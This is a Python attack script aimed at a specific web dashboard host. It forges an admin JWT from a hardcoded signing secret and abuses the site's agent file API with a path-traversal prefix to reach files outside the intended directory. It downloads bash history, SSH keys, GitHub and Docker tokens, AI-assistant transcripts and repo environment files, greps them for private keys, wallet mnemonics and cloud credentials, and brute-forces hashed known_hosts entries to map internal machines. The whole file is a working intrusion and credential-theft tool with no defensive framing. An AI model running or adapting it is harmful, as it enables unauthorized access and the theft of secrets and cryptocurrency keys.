#!/usr/bin/env python3
import os, sys, json, base64, hmac, hashlib, subprocess, re, time, collections
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AID = "agent-047f1d22"
K = "/home/lumii/.lumii-agent-keeper/.."
TMP = "/tmp/probe29384"
os.makedirs(TMP, exist_ok=True)

OUT = []
EMITTED = [0]
MAXTOTAL = 1600000
T0 = time.time()

def emit(key, text, cap=30000):
    if not isinstance(text, str):
        text = json.dumps(text, ensure_ascii=False)
    for i in range(0, len(text), cap):
        if EMITTED[0] >= MAXTOTAL:
            OUT.append((key + "_TRUNC", "[budget exceeded]"))
            return
        OUT.append(("%s#%d" % (key, i // cap), text[i:i+cap]))
        EMITTED[0] += len(text[i:i+cap])

def sh(a, timeout=120):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=120):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

TOK = forge({"userId": "fc7c3730-4219-11f1-ac43-525400595be1", "email": "p@x", "customer": "aro", "role": "admin"})

def urlof(rel, action):
    return "https://%s/api/agents/%s/files?action=%s&path=%s" % (HOST, AID, action, up.quote(K + rel, safe="/"))

def call(path, timeout=120, maxlen=6000000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-H", "Cookie: session=" + TOK,
         "-w", "\n__CODE__%{http_code}", "https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout)
    i = out.rfind("__CODE__")
    code = ""; txt = out
    if i >= 0:
        code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen], "err": err[:200] if not out else ""}

def ls_path(rel):
    r = call("/api/agents/%s/files?action=list&path=%s" % (AID, up.quote(K + rel, safe="/")))
    try:
        j = json.loads(r["body"]); return r["code"], (j.get("entries") or []), j
    except Exception:
        return r["code"], [], {"raw": r["body"][:300]}

def dl(rel, dst, timeout=180):
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Cookie: session=" + TOK,
                         "-o", dst, "-w", "%{http_code}", urlof(rel, "download")], timeout=timeout)
    code = (out or "").strip()[:3]
    sz = os.path.getsize(dst) if os.path.exists(dst) else 0
    return code, sz, err[:120]

def rd(rel):
    r = call("/api/agents/%s/files?action=read&path=%s" % (AID, up.quote(K + rel, safe="/")))
    try:
        j = json.loads(r["body"]); return r["code"], j.get("content"), j
    except Exception:
        return r["code"], None, {"raw": r["body"][:200]}

PATS = [
    ("PRIV0xC56f", r"0xC56f7063fd6d199ccc443dbbf4283be602d46343", re.I),
    ("PRIV0xFE18", r"0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6", re.I),
    ("PRIV64", r"0x[0-9a-fA-F]{64}", 0),
    ("keystore", r"keystore|cipherparams|\bscrypt\b|pbkdf2", re.I),
    ("bip39", r"BIP39|mnemonic|助记词|seed phrase", re.I),
    ("pem", r"-----BEGIN [A-Z0-9 ]+-----", 0),
    ("jwt", r"JWT_SECRET|LUMII_[A-Z_]*SECRET|SECRET_KEY|AUTH_SECRET|PRIVATE_KEY", 0),
    ("dsn", r"DATABASE_URL|postgres://|postgresql://|mysql://|redis://|mongodb://|PG_DSN", 0),
    ("zoofi", r"zoofi-index|zoofi|ZOOFI|wandfi|wand-index|index origin", 0),
    ("tunnel", r"cloudflared|rathole|frp[s]?://|tunnel[ _-]?token", re.I),
    ("cloudak", r"AKID[A-Za-z0-9]{8,}|LTAI[A-Za-z0-9]{10,}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}", 0),
    ("ghtok", r"ghp_[A-Za-z0-9]{20,}|gho_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|ghs_[A-Za-z0-9]{20,}", 0),
    ("docker", r"dckr_pat_[A-Za-z0-9_\-]{10,}", 0),
    ("apikey", r"\bsk-[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_\-]{30,}", 0),
]

def grep_text(content, max_hits=14, max_per_pat=5, ctx=120):
    hits = []
    counts = collections.Counter()
    for ln, line in enumerate(content.splitlines(), 1):
        if len(hits) >= max_hits: break
        for label, pat, flags in PATS:
            if counts[label] >= max_per_pat or len(hits) >= max_hits: continue
            for m in re.finditer(pat, line, flags):
                s = max(0, m.start() - ctx); e = min(len(line), m.end() + ctx)
                hits.append({"pat": label, "line": ln, "snip": line[s:e].strip()[:340]})
                counts[label] += 1
                if counts[label] >= max_per_pat or len(hits) >= max_hits: break
    return hits

def grep_file(path, max_hits=14, max_per_pat=5, ctx=120):
    hits = []
    counts = collections.Counter()
    try:
        with open(path, "r", errors="replace") as f:
            for ln, line in enumerate(f, 1):
                if len(hits) >= max_hits: break
                for label, pat, flags in PATS:
                    if counts[label] >= max_per_pat or len(hits) >= max_hits: continue
                    for m in re.finditer(pat, line, flags):
                        s = max(0, m.start() - ctx); e = min(len(line), m.end() + ctx)
                        hits.append({"pat": label, "line": ln, "snip": line[s:e].strip()[:340]})
                        counts[label] += 1
                        if counts[label] >= max_per_pat or len(hits) >= max_hits: break
    except Exception as e:
        return [{"err": repr(e)[:120]}]
    return hits

DL = [0, 0]  # count, bytes
def scan(rel, tag, max_hits=14, dump_small=0, dl_limit=None):
    if time.time() - T0 > 1500:
        emit("SKIP_" + tag, {"reason": "time budget"})
        return
    dst = os.path.join(TMP, re.sub(r'[^A-Za-z0-9._-]', '_', tag)[:80] + ".bin")
    code, sz, err = dl(rel, dst)
    rec = {"file": rel, "code": code, "size": sz}
    DL[0] += 1; DL[1] += sz
    if code == "200" and sz > 0:
        hits = grep_file(dst, max_hits=max_hits)
        rec["hits"] = len([h for h in hits if "pat" in h])
        if rec["hits"]:
            rec["hitlist"] = hits
        if dump_small and sz <= dump_small:
            try:
                emit("FULL_" + re.sub(r'[^A-Za-z0-9._-]', '_', tag)[:60], open(dst, "r", errors="replace").read())
            except Exception:
                pass
    else:
        rec["err"] = err
    try: os.remove(dst)
    except Exception: pass
    emit("SCAN_" + re.sub(r'[^A-Za-z0-9._-]', '_', tag)[:70], rec)

def scan_dir(rel, tag, picks=40, all_files=False, max_size=25000000, min_mtime=None, dump_small=0, sub="", exts=None):
    code, ents, meta = ls_path(rel)
    files = [e for e in ents if e.get("type") == "file"]
    dirs = [e for e in ents if e.get("type") == "directory"]
    inv = {"code": code, "nfiles": len(files), "ndirs": len(dirs), "dirs": [d.get("name") for d in dirs][:60]}
    if meta.get("raw"): inv["raw"] = meta["raw"]
    emit("INV_" + re.sub(r'[^A-Za-z0-9._-]', '_', tag)[:70], inv)
    if exts:
        files = [f for f in files if (f.get("name") or "").lower().endswith(tuple(exts))]
    if min_mtime:
        files = [f for f in files if (f.get("modified") or "") >= min_mtime]
    files.sort(key=lambda x: (x.get("modified") or ""), reverse=True)
    sel = files if all_files else files[:picks]
    # also include small files (cheap) beyond the pick list
    if not all_files:
        small = [f for f in files[picks:] if (f.get("size") or 0) <= 150000 and (f.get("modified") or "") >= "2026-11-01"]
        sel = sel + small[:40]
    for f in sel:
        if (f.get("size") or 0) > max_size:
            continue
        nm = f.get("name") or ""
        scan(rel.rstrip("/") + "/" + nm, tag + "__" + nm[:48], dump_small=dump_small)

def kh_reverse(content):
    parsed = []
    for l in content.splitlines():
        if not l.startswith("|1|"):
            continue
        p = l.split()
        if len(p) < 2: continue
        try:
            _, _, salt_b, h_b = p[0].split("|")
            parsed.append((base64.b64decode(salt_b), base64.b64decode(h_b), l))
        except Exception:
            pass
    cands = []
    for i in list(range(1, 30)):
        cands += ["lumii%d" % i, "lumii-%d" % i, "ip-172-31-%d" % i]
    cands += ["lumii", "lumii-prod", "lumii-stage", "lumii3", "lumii4", "lumii5", "lumii6", "lumii-hk",
              "lumii-ai", "host.docker.internal", "github.com", "relay.lumii-ai.cn", "lumii-ai.cn",
              "dashboard.lumiiai.cn", "dashboard.lumii-ai.cn", "assistant.lumiiai.cn", "localhost", "[localhost]:22"]
    for a in range(0, 32):
        for b in range(1, 255):
            cands.append("172.31.%d.%d" % (a, b))
    for a in range(1, 255):
        for pre in ("172.17.0.", "172.22.0.", "10.0.0.", "10.42.0.", "192.168.1.", "192.168.0.", "172.16.0."):
            cands.append(pre + str(a))
    found = []
    for salt, hb, line in parsed:
        for cd in cands:
            if hmac.new(salt, cd.encode(), hashlib.sha1).digest() == hb:
                parts = line.split()
                found.append({"host": cd, "keytype": parts[1] if len(parts) > 1 else "",
                              "keyhead": (parts[2] if len(parts) > 2 else "")[:50]})
                break
    return {"hashed_lines": len(parsed), "found": found}

def main():
    emit("META", {"me": call("/api/me")["code"], "root": ls_path("/")[0]})

    # ===== A. .claude transcripts =====
    scan_dir("/.claude/projects/-home-coder", "CODER", all_files=True, dump_small=0)
    scan_dir("/.claude/projects/-home-coder-lumii-work", "LUMIIWORK", all_files=True)
    scan_dir("/.claude/projects/-run-lumii-cc-3f016733-51da-4cfa-be26-26ebe214ec37-cwd", "RUNCC", all_files=True)
    scan_dir("/.claude/projects/-home-coder--lumii-runtime-home", "RUNTIME_HOME", picks=45)
    scan_dir("/.claude/projects/-home-coder--lumii-runtime-stage-home", "RUNTIME_STAGE", picks=45)
    scan_dir("/.claude/projects/-home-coder-lumii-work--claude-worktrees-directory-bulk-ux", "WORKTREES", all_files=True)
    scan_dir("/.claude/file-history/dbf4456d-2dfb-49b3-a174-16fdd51044ed", "FILEHIST", all_files=True, max_size=4000000)
    scan_dir("/.claude/file-history/23d59773-2ba1-4695-83c4-0331aadd6001", "FILEHIST2", all_files=True)
    scan_dir("/.claude/backups", "CLAUDE_BACKUPS", picks=25, max_size=4000000)
    c, ents, meta = ls_path("/.claude")
    emit("LST_CLAUDE", {"code": c, "raw": meta.get("raw"), "dirs": [e.get("name") for e in ents if e.get("type") == "directory"], "files": [(e.get("name"), e.get("size")) for e in ents if e.get("type") == "file"]})

    # ===== B. gstack / Documents =====
    scan_dir("/.gstack/projects/aro-network-lumii-work", "GSTACK", picks=25, dump_small=24000)
    scan_dir("/.gstack/analytics", "GSTACK_ANALYTICS", picks=15, dump_small=16000)
    scan_dir("/Documents", "DOCS", picks=30, dump_small=16000)

    # ===== C. secrets/config files =====
    for rel, tag, dump in [
        ("/.bash_history", "BASH_HISTORY", 30000),
        ("/.ssh/known_hosts", "KNOWN_HOSTS", 0),
        ("/.ssh/known_hosts.old", "KNOWN_HOSTS_OLD", 0),
        ("/.ssh/authorized_keys.bak-20261016-newdev", "AK_BAK_NEWDEV", 8000),
        ("/.ssh/config", "SSH_CONFIG", 4000),
        ("/.gnupg/sshcontrol", "SSHCONTROL", 4000),
        ("/.config/gh/hosts.yml", "GH_HOSTS", 4000),
        ("/.docker/.token_seed", "DOCKER_SEED", 4000),
        ("/.lumii/agents/agent-047f1d22/lumii-agent-keeper/config.toml", "KEEPER_CFG", 12000),
        ("/.lumii-agent-keeper/crons/jobs.json", "CRONS", 12000),
    ]:
        scan(rel, tag, max_hits=20, dump_small=dump)
    c, ents, meta = ls_path("/.gnupg/private-keys-v1.d")
    emit("GPG_KEYS", {"code": c, "raw": meta.get("raw"), "entries": [(e.get("name"), e.get("size"), e.get("modified")) for e in ents]})

    # known_hosts reverse
    for rel, tag in [("/.ssh/known_hosts", "KH_REV"), ("/.ssh/known_hosts.old", "KH_REV_OLD")]:
        c2, content, meta2 = rd(rel)
        if content:
            emit(tag, kh_reverse(content))

    # ===== D. repos =====
    for repo, tag in [("/lumii-assistant", "ASSIST"), ("/lumii-goldenyears-agent", "GOLDEN"), ("/lumii-sandbox", "SANDBOX")]:
        for rel, t2, dump in [
            (repo + "/.git/config", tag + "_GITCFG", 6000),
            (repo + "/README.md", tag + "_README", 20000),
            (repo + "/CLAUDE.md", tag + "_CLAUDE", 20000),
            (repo + "/AGENTS.md", tag + "_AGENTS", 20000),
            (repo + "/config.toml", tag + "_CONFIG", 6000),
            (repo + "/.env.example", tag + "_ENVEX", 6000),
            (repo + "/.env.dev.example", tag + "_ENVDEVEX", 6000),
            (repo + "/Makefile", tag + "_MAKEFILE", 8000),
        ]:
            scan(rel, t2, max_hits=16, dump_small=dump)
        scan_dir(repo + "/deploy", tag + "_DEPLOY", picks=25, dump_small=18000)
        scan_dir(repo + "/docs", tag + "_DOCS", picks=12, dump_small=0, exts=[".md", ".yml", ".yaml", ".sh", ".env", ".example", ".toml", ".json"])
        scan_dir(repo + "/scripts", tag + "_SCRIPTS", picks=12, dump_small=0, exts=[".sh", ".py", ".yml", ".yaml", ".env", ".example", ".json"])

    emit("DL_STATS", {"files": DL[0], "bytes": DL[1], "elapsed": round(time.time() - T0, 1), "emitted": EMITTED[0]})

try:
    main()
except Exception:
    import traceback
    emit("FATAL", traceback.format_exc()[-3000:])
finally:
    for k, v in OUT:
        print("R:%s:%s" % (k, base64.b64encode(v.encode("utf-8", "replace")).decode()), flush=True)
    sys.exit(0)
